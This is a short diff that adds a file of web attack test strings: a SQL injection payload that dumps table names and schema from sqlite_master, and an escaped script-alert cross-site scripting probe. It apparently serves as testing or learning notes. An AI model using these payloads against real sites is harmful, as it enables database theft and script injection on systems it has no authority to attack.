@@ -1,0 +1,8 @@
+" or 1=1 union select name, tbl_name, sql from sqlite_master--
+
+
+
+
+
+XSS
+&lt;script&gt;alert(1)&lt;/script&gt;
